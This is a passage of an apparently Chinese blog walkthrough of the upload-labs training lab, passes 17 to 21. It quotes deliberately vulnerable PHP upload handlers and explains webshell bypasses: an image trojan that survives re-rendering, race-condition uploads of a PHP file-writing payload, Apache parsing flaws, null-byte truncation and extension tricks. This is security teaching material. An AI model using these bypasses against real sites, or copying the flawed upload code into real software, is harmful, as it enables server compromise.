UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">basename(<span class="keyword">string</span> <span class="variable">$path</span> [,<span class="keyword">string</span> <span class="variable">$suffix</span>]) <span class="comment">//返回路径中的文件名部分</span></span><br><span class="line">imagecreatefromjpeg(<span class="keyword">string</span> <span class="variable">$filename</span>)</span><br><span class="line">imagecreatefrompng(<span class="keyword">string</span> <span class="variable">$filename</span>) </span><br><span class="line">imagecreatefromgif(<span class="keyword">string</span> <span class="variable">$filename</span>) <span class="comment">//由文件或URL创建一个新图像，内容不对则失败返回false，成功后返回图像资源</span></span><br><span class="line">srand([<span class="keyword">int</span> <span class="variable">$seed</span> ]) <span class="comment">//用seed播下随机数发生器种子</span></span><br><span class="line">strval(mixed <span class="variable">$var</span>) <span class="comment">//返回字符串类型的var</span></span><br><span class="line">imagejpeg(resource <span class="variable">$image</span> [,<span class="keyword">string</span> <span class="variable">$filename</span> [,<span class="keyword">int</span> <span class="variable">$quality</span>]])<span class="comment">//从image图像以filename为文件名创建一个JPEG图像</span></span><br><span class="line">imagepng(resource <span class="variable">$image</span> [,<span class="keyword">string</span> <span class="variable">$filename</span>]) <span class="comment">//从 image 图像以filename为文件名创建一个PNG图像或文件</span></span><br><span class="line">imagegif(resource <span class="variable">$image</span> [,<span class="keyword">string</span> <span class="variable">$filename</span>]) <span class="comment">//从 image 图像以filename为文件名创建一个GIF图像或文件</span></span><br></pre></td></tr></table></figure><h3 id="bypass-16"><a href="#bypass-16" class="headerlink" title="bypass"></a>bypass</h3><p>使用容易绕过二次渲染的gif文件</p><p>1、制作gif格式的图片🐎，上传。</p><p>2、尝试是否能利用，若不能利用则将其下载，与原🐎进行比较，寻找二次渲染不改变的地方插入🐎</p><p>（jpg原理类似，而png可以将🐎放在CBC或者IDAT块来绕过二次渲染）</p><p><img src="https://i.loli.net/2021/02/13/JLmRVfIl4TSWvsi.png" alt="渲染后"></p><p><img src="https://i.loli.net/2021/02/13/IxFM4hN5UVGiJnQ.png" alt="插入"></p><p>成功利用：</p><p><img src="https://i.loli.net/2021/02/13/lT3AnLyM9vtFRH8.png" alt="成功解析"></p><h2 id="pass18（白名单-条件竞争-文件删除）"><a href="#pass18（白名单-条件竞争-文件删除）" class="headerlink" title="pass18（白名单-条件竞争-文件删除）"></a>pass18（白名单-条件竞争-文件删除）</h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>tips：<code>只允许上传.jpg|.png|.gif类型文件！</code>，需要代码审计</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);<span class="comment">#获取文件后缀</span></span><br><span class="line">    <span class="comment">#strrops,计算指定字符串在目标字符串中最后一次出现的位置，这里目的是返回&quot;.&quot;在filename中最后出现的位置</span></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;<span class="comment">#将上传的文件移动到新位置</span></span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;<span class="comment">#检查文件后缀，符号jpg|png|gif则重命名</span></span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;<span class="comment">#文件重命名</span></span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>); <span class="comment">#将upload_file重命名为img_path </span></span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">#不符合则删除文件</span></span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);<span class="comment">#不符合则使用unlink函数删除</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们上传的文件会被存放在临时文件夹中，并且后端对文件进行判断与删除时需要一定时间</p><p>尝试条件竞争</p><p>通过发送并发包（也就是发很多个包~重复上传php文件），利用后端判断、删除的时间差，不断访问我们上传的文件（目的时让中间件解析上传文件）</p><p>因为我们上传的php文件最终都会被删除，因此最终绕过的方法是上传内容为<code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code>的php文件，再不断访问上传文件达成解析的目的。</p><p>解析成功的话就能在同目录下写入一个包含<code>&lt;?php phpinfo(); ?&gt;</code>的info.php文件了</p><h3 id="bypass-17"><a href="#bypass-17" class="headerlink" title="bypass"></a>bypass</h3><p>条件竞争：（多线程、同时、同一个文件）</p><p>发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中</p><p>由此进行bypass</p><p>1、抓上传包和访问包；并发送到intruder模块</p><p><img src="https://i.loli.net/2021/02/13/3Uwh12sjIaq6Hgf.png"><img src="https://i.loli.net/2021/02/13/Dkfr7MCcu1eOyTL.png"></p><p>2、利用intruder重复发送、访问，从而达成解析上传文件的目的~</p><p>在url中添加参数a=1（作为payload的攻击参数），payload选择numeber输个合适的范围就可以了</p><p><img src="https://i.loli.net/2021/02/13/maQlK6NdA9tCcgo.png"></p><p>将线程数调大</p><p><img src="https://i.loli.net/2021/02/13/t6T3eJYRMp1yizc.png"></p><p>状态码回显200，访问成功了，说明其中的代码被成功解析</p><p><img src="https://i.loli.net/2021/02/13/cqOZ7MaA6f2XLYy.png"></p><p>尝试访问：</p><p><img src="https://i.loli.net/2021/02/13/4vGt5wQp3dFqV8i.png"></p><p>成功啦</p><h2 id="pass19（白名单-条件竞争-）"><a href="#pass19（白名单-条件竞争-）" class="headerlink" title="pass19（白名单-条件竞争-）"></a>pass19（白名单-条件竞争-）</h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();<span class="comment"># 判断文件是否是通过 HTTP POST 上传的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名</p><p>与pass18的相比，增添了检查文件后缀的waf，要求文件后缀必须是 jpg | png | gif</p><h3 id="bypass-18"><a href="#bypass-18" class="headerlink" title="bypass"></a>bypass</h3><h4 id="条件竞争（重命名）-图片马-文件包含"><a href="#条件竞争（重命名）-图片马-文件包含" class="headerlink" title="条件竞争（重命名）+ 图片马 + 文件包含"></a>条件竞争（重命名）+ 图片马 + 文件包含</h4><p>上传图片🐎，利用include.php文件包含写入shell</p><p>这里想要解析图片🐎需要利用文件包含漏洞，使用自带的include.php就行了</p><p>图片🐎插入语句仍为：<code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p>像pass18一样，抓上传包和访问包不断重发，利用重命名的时间差即可成功访问文件</p><p>（这里可能源码有问题，upload和文件名少了/；如upload/compare.jpg变成了uploadcompare.jpg;访问的时候注意一下）</p><p><img src="https://i.loli.net/2021/02/13/N1qoDxCHAzZkT6a.png"></p><p>可以看到info被成功写入了，访问即可</p><p><img src="https://i.loli.net/2021/02/13/eKmtIRpy3aj2XkP.png"></p><h4 id="条件竞争（重命名）-利用apache解析漏洞"><a href="#条件竞争（重命名）-利用apache解析漏洞" class="headerlink" title="条件竞争（重命名）+ 利用apache解析漏洞"></a>条件竞争（重命名）+ 利用apache解析漏洞</h4><p>官方环境要求使用的apache版本为2.4.10；可以使用apache解析漏洞</p><blockquote><p>apache解析漏洞：<br>Apache默认一个文件可以有多个以点.分割的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交个php处理这个文件。（即从右向左识别，遇到无法无法识别的后缀则跳过）</p></blockquote><p>因此我们可以上传后缀为<code>.php.jpg</code>的文件，然后不断访问<code>xxx.php.jpg</code>即可解析</p><p>该文件插入语句仍为：<code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p>解析后生成info.php在同目录下，访问即可</p><p>（似乎直接以该文件作为🐎来连接也可以？）</p><h2 id="pass20（黑名单）"><a href="#pass20（黑名单）" class="headerlink" title="pass20（黑名单）"></a>pass20（黑名单）</h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p><img src="https://i.loli.net/2021/02/13/xMJU9omDzHsjWB8.png"></p><p>允许我们自定义文件名，但存在黑名单，无法直接上传php这些后缀</p><p>tips：本pass的取文件名通过$_POST来获取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">       <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br></pre></td></tr></table></figure><h3 id="bypass-19"><a href="#bypass-19" class="headerlink" title="bypass"></a>bypass</h3><p>之前黑名单绕过的大部分姿势都可以用上,比如大小写绕过啥的都可以</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>具体原理看pass13，00截断要注意版本</p><p><img src="https://i.loli.net/2021/02/13/zq2xaVO5isE4keb.png"></p><p>访问即可~</p><p><img src="https://i.loli.net/2021/02/13/rRmhWJ9s4BSKAtI.png"></p><h4 id="“-”点号绕过"><a href="#“-”点号绕过" class="headerlink" title="“.”点号绕过"></a>“.”点号绕过</h4><p>windows中php会自动去除后缀名中最后的 “.” 的符号</p><p><img src="https://i.loli.net/2021/02/13/BP9pRLf74Ss8UKN.png"></p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p><img src="https://i.loli.net/2021/02/13/7nwLtzky4pdb68a.png"></p><h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><p><img src="https://i.loli.net/2021/02/13/H1NB3Jq8aoP42Vb.png"></p><h2 id="pass21（白名单-源自CTF代码审计）"><a href="#pass21（白名单-源自CTF代码审计）" class="headerlink" title="pass21（白名单-源自CTF代码审计）"></a>pass21（白名单-源自CTF代码审计）</h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>源自CTF-代码审计一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 